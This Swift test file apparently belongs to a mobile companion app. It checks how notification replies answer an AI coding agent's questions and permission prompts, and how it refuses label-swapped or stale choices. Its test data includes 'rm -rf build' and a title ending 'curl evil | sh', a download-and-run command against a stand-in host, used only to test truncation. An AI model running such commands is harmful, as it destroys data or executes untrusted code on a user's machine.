import CmuxAgentQuestion
import CmuxMobileAgentChat
import CmuxMobileNotifications
import Foundation
import Testing
@testable import CmuxMobileLive

/// A notification reply becomes the same hub call the chat and the Feed make
/// (verify/rich-push.md, "Reply delivery").
@Suite struct PushReplyPlanTests {
    func pending(_ text: String, id: String = "q1") throws -> AgentSessionEvent {
        let request = try JSONDecoder().decode(JSONValue.self, from: Data(text.utf8))
        return try #require(AcpmuxRecords(sessionID: "s").permission(id, request: request))
    }

    func question(multi: Bool = false) throws -> AgentSessionEvent {
        try pending(#"{"toolCall":{"toolCallId":"q1","title":"Question","kind":"other","_meta":{"claude":{"tool":"AskUserQuestion"}},"rawInput":{"questions":[{"question":"Which?","header":"Pick","options":[{"label":"A"},{"label":"B"}],"multiSelect":\#(multi)},{"question":"Why?","options":[{"label":"Fast"},{"label":"Safe"}],"multiSelect":false}]}},"options":[{"optionId":"allow_once","name":"Answer","kind":"allow_once"},{"optionId":"reject_once","name":"Reject","kind":"reject_once"}]}"#)
    }

    func single() throws -> AgentSessionEvent {
        try pending(#"{"toolCall":{"toolCallId":"q1","title":"Question","kind":"other","_meta":{"claude":{"tool":"AskUserQuestion"}},"rawInput":{"questions":[{"question":"Which?","options":[{"label":"A"},{"label":"B"}],"multiSelect":false}]}},"options":[{"optionId":"allow_once","name":"Answer","kind":"allow_once"},{"optionId":"reject_once","name":"Reject","kind":"reject_once"}]}"#)
    }

    func permission() throws -> AgentSessionEvent {
        try pending(#"{"toolCall":{"toolCallId":"c1","title":"rm -rf build","kind":"execute"},"options":[{"optionId":"a1","name":"Allow","kind":"allow_once"},{"optionId":"a2","name":"Always","kind":"allow_always"},{"optionId":"r2","name":"Never","kind":"reject_always"},{"optionId":"r1","name":"Reject","kind":"reject_once"}]}"#, id: "p1")
    }

    func reply(_ kind: PushKind, _ action: PushReply.Action) -> PushReply {
        PushReply(mac: "m", kind: kind, sessionId: "s", permissionId: "q1", action: action)
    }

    @Test func aButtonAnswersTheSingleChoiceQuestion() throws {
        guard case .answer(let question, let answer) = try PushReplyPlan.make(reply(.question, .option(1, label: "B")), pending: single()) else {
            Issue.record("not an answer")
            return
        }
        let reply = try question.reply(answer)
        #expect(reply.answers == .object(["Which?": .string("B")]))
    }

    @Test func theFormAnswersEveryQuestionWithMultiSelectAndOther() throws {
        let action = PushReply.Action.answers(selected: [["A", "B"], []], other: ["", "both"])
        guard case .answer(let question, let answer) = try PushReplyPlan.make(reply(.question, action), pending: question(multi: true)) else {
            Issue.record("not an answer")
            return
        }
        #expect(try question.reply(answer).answers == .object(["Which?": .string("A, B"), "Why?": .string("both")]))
    }

    @Test func anIncompleteFormIsRefusedBeforeAnythingIsSent() throws {
        let action = PushReply.Action.answers(selected: [["A"]], other: [])
        #expect(throws: PushReplyPlan.Refusal.self) { try PushReplyPlan.make(reply(.question, action), pending: question()) }
    }

    @Test func allowAndDenyUseThePromptsOwnOptions() throws {
        let allow = try PushReplyPlan.make(PushReply(mac: "m", kind: .permission, sessionId: "s", permissionId: "p1", action: .allow(optionID: "a2")), pending: permission())
        #expect(allow == .respond(sessionID: "s", permissionID: "p1", optionID: "a2"))
        // Deny without an id is the one-time reject, never the lasting one.
        let deny = try PushReplyPlan.make(PushReply(mac: "m", kind: .permission, sessionId: "s", permissionId: "p1", action: .deny(optionID: nil)), pending: permission())
        #expect(deny == .respond(sessionID: "s", permissionID: "p1", optionID: "r1"))
        // An allow id the prompt does not offer as an allow is refused (a reject id posing as one too).
        #expect(throws: PushReplyPlan.Refusal.self) {
            try PushReplyPlan.make(PushReply(mac: "m", kind: .permission, sessionId: "s", permissionId: "p1", action: .allow(optionID: "r1")), pending: permission())
        }
    }

    @Test func anAnsweredPromptIsRefused() {
        #expect(throws: PushReplyPlan.Refusal.self) { try PushReplyPlan.make(reply(.question, .option(0, label: "A")), pending: nil) }
    }

    @Test func textRepliesPromptTheSessionOnceOrReachChief() throws {
        let r = reply(.completed, .text("go on", attachments: ["a.png"]))
        #expect(try PushReplyPlan.make(r, pending: nil) == .prompt(sessionID: "s", text: "go on", attachments: ["a.png"], promptID: r.id.uuidString.lowercased()))
        #expect(try PushReplyPlan.make(reply(.chief, .text("hi", attachments: [])), pending: nil) == .chief(text: "hi", attachments: []))
        // A terminal notification with no ledger id takes no reply.
        #expect(throws: PushReplyPlan.Refusal.self) { try PushReplyPlan.make(reply(.terminal, .text("ls", attachments: [])), pending: nil) }
    }

    /// PR B: a reply to a terminal notification is `notification-reply` for that
    /// notification, text only, at most 4 KB.
    @Test func terminalRepliesGoToTheNotifyingTerminal() throws {
        let r = PushReply(mac: "m", kind: .terminal, tabId: "s7", notificationId: "42", action: .text("yes", attachments: []))
        #expect(try PushReplyPlan.make(r, pending: nil) == .terminal(notification: "42", text: "yes"))
        let image = PushReply(mac: "m", kind: .terminal, notificationId: "42", action: .text("yes", attachments: ["a.png"]))
        #expect(throws: PushReplyPlan.Refusal.self) { try PushReplyPlan.make(image, pending: nil) }
        let long = PushReply(mac: "m", kind: .terminal, notificationId: "42", action: .text(String(repeating: "y", count: 4097), attachments: []))
        #expect(throws: PushReplyPlan.Refusal.self) { try PushReplyPlan.make(long, pending: nil) }
    }
}

/// PR B: the link's `notification-reply` carries the reply's id, so the Mac
/// applies a reply once whichever way (link or mailbox) it arrives first.
@Suite struct TerminalReplyRequestTests {
    @Test func theRequestCarriesTheReplyID() throws {
        let id = UUID(uuidString: "0d9f5e2c-7b3a-4e61-8f20-5c4b3a291807")!
        let request = PushReplyPlan.terminalRequest(notification: "42", text: "yes", replyID: id)
        #expect(request["notification"] as? Int == 42)
        #expect(request["text"] as? String == "yes")
        #expect(request["reply_id"] as? String == "0d9f5e2c-7b3a-4e61-8f20-5c4b3a291807")
        #expect(Set(request.keys) == ["notification", "text", "reply_id"])
        // A ledger id that is not a number goes as text.
        #expect(PushReplyPlan.terminalRequest(notification: "n-1", text: "y", replyID: id)["notification"] as? String == "n-1")
    }

    @Test func aDuplicateIsDelivered() {
        #expect(PushReplyPlan.terminalAnswer(Data(#"{"ok":true,"data":{"duplicate":true}}"#.utf8)) == .delivered)
        #expect(PushReplyPlan.terminalAnswer(Data(#"{"ok":true}"#.utf8)) == .delivered)
        #expect(PushReplyPlan.terminalAnswer(Data(#"{"ok":false,"error":{"message":"no such notification"}}"#.utf8))
            == .refused("no such notification"))
        #expect(PushReplyPlan.terminalAnswer(Data(#"{"error":"gone"}"#.utf8)) == .refused("gone"))
    }
}

#if os(iOS)
/// PR B: what the mailbox carries for an Allow (the acpmux approval, as numbers acpmux reads).
/// `LiveCoordinator` is iOS-only, so the macOS `swift test` run skips this suite.
@Suite struct MailboxApprovalTests {
    @Test func theApprovalMetaBecomesCanonicalJSON() {
        let payload = ApprovalPayload(instance: "pi", macDevice: "m", approver: "p", session: "s", permission: "q", option: "o",
                                      nonce: "dn", expiresAt: 1_800_000_120)
        let meta = LiveCoordinator.pushJSON(payload.meta(signature: Data([0xab])))
        #expect(meta.canonical == #"{"acpmux":{"approverDecision":{"approver":"p","expiresAt":1800000120,"signature":"ab"},"decisionNonce":"dn"}}"#)
    }
}
#endif

@MainActor @Suite struct PushSnapshotsTests {
    @Test func promptsThenRepliesNewestLast() {
        var a = AgentTurn(id: "1", prompt: "fix it", promptAt: Date())
        a.items = [.message(id: "m1", markdown: "done"), .thought(id: "t", text: "hmm")]
        var b = AgentTurn(id: "2", prompt: "ship", promptAt: Date())
        b.status = .failed
        b.errorText = "rate limited"
        let messages = PushSnapshots.messages([a, b])
        #expect(messages.map(\.text) == ["fix it", "done", "ship", "rate limited"])
        #expect(messages.map(\.role) == [.user, .agent, .user, .system])
    }
}

/// Review of #24156 (M1, #5): an answer is bound to the labels the person saw.
@Suite struct PushReplyLabelTests {
    func pending(_ text: String) throws -> AgentSessionEvent {
        let request = try JSONDecoder().decode(JSONValue.self, from: Data(text.utf8))
        return try #require(AcpmuxRecords(sessionID: "s").permission("q1", request: request))
    }

    func ask(_ labels: [String], multi: Bool = false) throws -> AgentSessionEvent {
        let options = labels.map { #"{"label":"\#($0)"}"# }.joined(separator: ",")
        return try pending(#"{"toolCall":{"toolCallId":"q1","title":"Question","kind":"other","_meta":{"claude":{"tool":"AskUserQuestion"}},"rawInput":{"questions":[{"question":"Deploy?","options":[\#(options)],"multiSelect":\#(multi)}]}},"options":[{"optionId":"allow_once","name":"Answer","kind":"allow_once"},{"optionId":"reject_once","name":"Reject","kind":"reject_once"}]}"#)
    }

    func reply(_ action: PushReply.Action) -> PushReply {
        PushReply(mac: "m", kind: .question, sessionId: "s", permissionId: "q1", action: action)
    }

    func chosen(_ plan: PushReplyPlan) throws -> AgentQuestionJSON? {
        guard case .answer(let question, let answer) = plan else { return nil }
        return try question.reply(answer).answers
    }

    @Test func aButtonWhoseLabelChangedIsRefused() throws {
        // The Worker swapped the labels: the button said "No" at the place of "Yes, deploy".
        #expect(throws: PushReplyPlan.Refusal.self) {
            try PushReplyPlan.make(reply(.option(0, label: "No")), pending: ask(["Yes, deploy", "No"]))
        }
    }

    @Test func aButtonWhoseOptionMovedIsRefusedNotGuessed() throws {
        // The Mac's list changed since the push: the index names another option now.
        #expect(throws: PushReplyPlan.Refusal.self) {
            try PushReplyPlan.make(reply(.option(1, label: "No")), pending: ask(["No", "Yes, deploy"]))
        }
        let plan = try PushReplyPlan.make(reply(.option(1, label: "Yes, deploy")), pending: ask(["No", "Yes, deploy"]))
        #expect(try chosen(plan) == .object(["Deploy?": .string("Yes, deploy")]))
    }

    @Test func aCutLabelStillMatchesItsOption() throws {
        let long = "Deploy the staging branch to production right now please"
        let plan = try PushReplyPlan.make(reply(.option(0, label: "Deploy the staging bran…")), pending: ask([long, "No"]))
        #expect(try chosen(plan) == .object(["Deploy?": .string(long)]))
    }

    @Test func formAnswersMatchCutLabelsAndRefuseUnknownOnes() throws {
        let long = "Run the whole integration suite on every platform"
        let ok = try PushReplyPlan.make(reply(.answers(selected: [["Run the whole integra…", "B"]], other: [""])), pending: ask([long, "B"], multi: true))
        #expect(try chosen(ok) == .object(["Deploy?": .string("\(long), B")]))
        #expect(throws: PushReplyPlan.Refusal.self) {
            try PushReplyPlan.make(reply(.answers(selected: [["B", "Gone"]], other: [""])), pending: ask(["A", "B"], multi: true))
        }
    }
}

/// The Face ID prompt names what is being sent (review M1, L3).
@Suite struct ApprovalReasonTests {
    @Test func anAnswerNamesItsChoices() throws {
        let request = try JSONDecoder().decode(JSONValue.self, from: Data(#"{"toolCall":{"toolCallId":"q1","title":"Question","kind":"other","_meta":{"claude":{"tool":"AskUserQuestion"}},"rawInput":{"questions":[{"question":"Deploy?","options":[{"label":"Yes, deploy"},{"label":"No"}],"multiSelect":false}]}},"options":[{"optionId":"allow_once","name":"Answer","kind":"allow_once"}]}"#.utf8))
        guard case .question(let question) = try #require(AcpmuxRecords(sessionID: "s").permission("q1", request: request)),
              let item = question.items.first else {
            Issue.record("no question")
            return
        }
        let answer = AgentQuestionAnswer(selections: [item.id: .init(optionIDs: [item.options[0].id])])
        #expect(AcpmuxHub.answerReason(question, answer) == "Answer “Yes, deploy”")
        let other = AgentQuestionAnswer(selections: [item.id: .init(optionIDs: [], other: "ship it")])
        #expect(AcpmuxHub.answerReason(question, other) == "Answer “ship it”")
    }

    @Test func aLongTitleIsMarkedAsCut() {
        let reason = AcpmuxHub.allowReason(title: "rm -rf build " + String(repeating: "x", count: 100) + " && curl evil | sh")
        #expect(reason.hasSuffix("…”"))
        #expect(AcpmuxHub.allowReason(title: "ls") == "Allow “ls”")
        #expect(AcpmuxHub.allowReason(title: "") == "Allow the agent's request")
    }
}
